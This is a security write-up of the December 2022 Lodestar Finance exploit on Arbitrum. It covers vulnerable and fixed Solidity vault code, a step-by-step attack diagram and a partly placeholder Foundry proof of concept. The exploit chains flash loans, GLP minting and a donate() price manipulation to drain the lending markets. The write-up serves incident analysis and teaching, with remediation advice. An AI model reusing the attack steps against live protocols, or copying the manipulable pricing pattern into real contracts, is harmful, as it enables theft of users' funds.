# Lodestar Finance — GLP donate() Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | Lodestar Finance |
| **Chain** | Arbitrum |
| **Loss** | ~$4,500,000 |
| **USDC** | [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8](https://arbiscan.io/address/0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8) |
| **WETH** | [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1](https://arbiscan.io/address/0x82aF49447D8a07e3bd95BD0d56f35241523fBab1) |
| **PlvGLP Token** | [0x5326E71Ff593Ecc2CF7AcaE5Fe57582D6e74CFF1](https://arbiscan.io/address/0x5326E71Ff593Ecc2CF7AcaE5Fe57582D6e74CFF1) |
| **lplvGLP (cToken)** | [0xCC25daC54A1a62061b596fD3Baf7D454f34c56fF](https://arbiscan.io/address/0xCC25daC54A1a62061b596fD3Baf7D454f34c56fF) |
| **Lodestar Unitroller** | [0x8f2354F9464514eFDAe441314b8325E97Bf96cdc](https://arbiscan.io/address/0x8f2354F9464514eFDAe441314b8325E97Bf96cdc) |
| **sGLP** | [0x2F546AD4eDD93B956C8999Be404cdCAFde3E89AE](https://arbiscan.io/address/0x2F546AD4eDD93B956C8999Be404cdCAFde3E89AE) |
| **GMX Router** | [0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064](https://arbiscan.io/address/0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064) |
| **Root Cause** | Donating sGLP directly into the plvGLP vault via the GLP `donate()` function inflates the plvGLP price, enabling an attacker to borrow all assets from Lodestar using the manipulated collateral |
| **CWE** | CWE-840: Business Logic Errors |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Lodestar_exp.sol) |

---
## 1. Vulnerability Overview

Lodestar Finance was a lending protocol that accepted plvGLP (Plutus's GLP vault token) as collateral. The price of plvGLP was calculated by dividing the sGLP balance held in the vault by the total plvGLP supply. The attacker flash-borrowed tens of millions of dollars in total from multiple sources including Aave (17.29M USDC, 9,500 WETH, 406K DAI), Radiant (14.435M USDC), and Uniswap V3/V2. Using the borrowed funds, the attacker minted a large amount of GLP via GMX, then donated sGLP directly into the plvGLP vault through the `donate()` function, artificially inflating the plvGLP price. With this manipulated collateral price, the attacker borrowed all available assets (USDC, WETH, DAI, USDT, FRAX) from Lodestar's lplvGLP market, stealing approximately $4.5M.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable plvGLP Vault — price manipulation possible via donate()
contract PlvGLPVault {
    IERC20 public sGLP;
    uint256 public totalAssets; // sGLP balance

    // ❌ Anyone can donate sGLP directly into the vault
    // → totalAssets increases → plvGLP price rises
    function donate(uint256 amount) external {
        sGLP.transferFrom(msg.sender, address(this), amount);
        totalAssets += amount;  // ❌ price can be manipulated externally
    }

    // plvGLP price = totalAssets / totalSupply
    function pricePerShare() external view returns (uint256) {
        return totalAssets * 1e18 / totalSupply();
    }
}

// Lodestar lplvGLP — collateral valuation based on plvGLP price
contract LplvGLP {
    IPlvGLPVault public plvGLPVault;

    function getUnderlyingPrice() external view returns (uint256) {
        // ❌ Uses pricePerShare manipulated via donate()
        return plvGLPVault.pricePerShare() * plvGLPPrice / 1e18;
    }
}

// ✅ Correct pattern — disable donate() or defend against price manipulation
contract SafePlvGLPVault {
    // ✅ Remove donate() or restrict to onlyOwner
    function donate(uint256 amount) external onlyOwner {
        // Only protocol operators can donate
        sGLP.transferFrom(msg.sender, address(this), amount);
        totalAssets += amount;
    }

    // ✅ TWAP-based price or manipulation detection logic
    function pricePerShare() external view returns (uint256) {
        uint256 spot = totalAssets * 1e18 / totalSupply();
        uint256 twap = _getTWAPPrice();
        // ✅ Use TWAP if deviation from spot is large
        if (spot > twap * 110 / 100) return twap;
        return spot;
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**Lodestar_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: Donating sGLP directly into the plvGLP vault via the GLP `donate()` function inflates the plvGLP price, enabling borrowing of all assets from Lodestar using the manipulated collateral
    function upgradeTo(address arg0) external {}  // 0x3659cfe6
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Aave flash loan: 17.29M USDC + 9,500 WETH + 406K DAI
    │
    ├─[2] Radiant nested flash loan: 14.435M USDC
    │
    ├─[3] Uniswap V3/V2 additional flash: WETH, USDC, USDT, FRAX
    │
    ├─[4] Deposit 70M USDC as cUSDC collateral (enter Lodestar)
    │
    ├─[5] Recursive lplvGLP mint × 16 times
    │       plvGLP supply increases
    │
    ├─[6] Mint GLP via GMX Reward with ETH/FRAX/USDC/DAI/USDT
    │       Acquire large amount of sGLP
    │
    ├─[7] Call GlpDepositor.donate(all sGLP)
    │       ❌ Donate sGLP directly into plvGLP vault
    │       → totalAssets spikes → plvGLP price skyrockets
    │
    ├─[8] Enter Lodestar using lplvGLP as collateral
    │       Collateral value skyrockets based on manipulated plvGLP price
    │
    ├─[9] Borrow all available assets
    │       Full amount of USDC, WETH, DAI, USDT, FRAX
    │       ~4,500 ETH equivalent drained
    │
    ├─[10] Repay flash loans sequentially
    │        Uniswap V2 → V3 → Radiant → Aave
    │
    └─[11] Net profit: ~$4,500,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IGlpDepositor {
    function donate(uint256 amount) external;
}

interface IGMXReward {
    function mintAndStakeGlp(
        address token, uint256 amount, uint256 minUsdg, uint256 minGlp
    ) external returns (uint256);
}

interface ICErc20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiver, address[] calldata assets,
        uint256[] calldata amounts, uint256[] calldata modes,
        address onBehalfOf, bytes calldata params, uint16 referral
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract LodestarExploit is Test {
    IERC20        USDC       = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20        WETH       = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20        plvGLP     = IERC20(0x5326E71Ff593Ecc2CF7AcaE5Fe57582D6e74CFF1);
    ICErc20       lplvGLP    = ICErc20(0xCC25daC54A1a62061b596fD3Baf7D454f34c56fF);
    IUnitroller   unitroller = IUnitroller(0x8f2354F9464514eFDAe441314b8325E97Bf96cdc);
    IGlpDepositor depositor  = IGlpDepositor(/* GlpDepositor */);
    IGMXReward    gmxReward  = IGMXReward(/* GMX RewardRouter */);
    IAaveFlashloan aave      = IAaveFlashloan(/* Aave V2 */);

    function setUp() public {
        vm.createSelectFork("arbitrum", 45_121_903);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        // [Step 1] Initiate Aave flash loan (nested flash loan chain)
        address[] memory assets = new address[](3);
        assets[0] = address(USDC); assets[1] = address(WETH); assets[2] = /* DAI */address(0);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 17_290_000 * 1e6; amounts[1] = 9_500 * 1e18; amounts[2] = 406_316 * 1e18;
        uint256[] memory modes = new uint256[](3);
        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        // [Step 4] Deposit cUSDC collateral (enter Lodestar)
        USDC.approve(/* cUSDC */, type(uint256).max);
        ICErc20(/* cUSDC */).mint(70_000_000 * 1e6);
        address[] memory markets = new address[](1);
        markets[0] = /* cUSDC */address(0);
        unitroller.enterMarkets(markets);

        // [Step 5] Recursive lplvGLP mint × 16 times
        for (uint256 i = 0; i < 16; i++) {
            plvGLP.approve(address(lplvGLP), type(uint256).max);
            lplvGLP.mint(plvGLP.balanceOf(address(this)));
        }

        // [Step 6] Mint GLP with multiple assets
        USDC.approve(address(gmxReward), type(uint256).max);
        gmxReward.mintAndStakeGlp(address(USDC), USDC.balanceOf(address(this)) / 2, 0, 0);

        // [Step 7] sGLP donate → plvGLP price manipulation
        // ⚡ Key: totalAssets spikes → pricePerShare skyrockets
        IERC20(/* sGLP */).approve(address(depositor), type(uint256).max);
        depositor.donate(IERC20(/* sGLP */).balanceOf(address(this)));

        // [Steps 8–9] Borrow all assets using manipulated collateral value
        unitroller.enterMarkets(new address[](1)); // enter lplvGLP market
        lplvGLP.borrow(/* max USDC */);

        // Repay flash loan
        USDC.approve(/* Aave */, amounts[0] + premiums[0]);
        return true;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | plvGLP vault price manipulation via GLP `donate()` function → Lodestar collateral value inflation |
| **CWE** | CWE-840: Business Logic Errors |
| **OWASP DeFi** | Price Oracle Manipulation |
| **Attack Vector** | Multi-source flash loans (Aave + Radiant + Uniswap) → GLP minting → `donate()` → plvGLP price spike → full asset borrow |
| **Preconditions** | `donate()` function callable by anyone; plvGLP price depends on spot `totalAssets/totalSupply` |
| **Impact** | ~$4,500,000 |

---
## 6. Remediation Recommendations

1. **Access Control on donate()**: Restrict the `donate()` function to `onlyOwner` or internal protocol functions only, preventing external parties from arbitrarily increasing vault assets.
2. **TWAP-Based Price Oracle**: Calculate the plvGLP price using a TWAP of 30 minutes or more rather than the spot `pricePerShare()`, preventing single-transaction manipulation.
3. **Collateral Price Deviation Guard**: Introduce a circuit breaker that temporarily halts borrowing if the collateral price change relative to the previous block exceeds a defined threshold (e.g., 5%).
4. **Block Collateral Use During Flash Loans**: Detect and block the pattern of flash loan borrowing + collateral deposit + borrowing within the same transaction.

---
## 7. Lessons Learned

- **Vault Price and Direct Donations**: In ERC4626 or similar vaults, if `donate()` or direct token transfers can increase `totalAssets`, every protocol that uses this as a price oracle is exposed to attack. Price calculation for vault-based collateral must account for manipulation resistance.
- **Capital Scale of Multi-Source Flash Loans**: Leveraging Aave, Radiant, and Uniswap V3/V2 together to amass tens of millions of dollars in capital was sufficient to manipulate the GLP price. High-value collateral protocols must be resilient against large-capital attacks.
- **Cascading Vulnerabilities in Composite DeFi Protocols**: In the composite structure combining Plutus (plvGLP) + GMX (GLP) + Lodestar (lending), the entire system was compromised through the weakest link (the `donate()` function). When composing multiple protocols, the manipulation resistance of each protocol's pricing must be verified independently.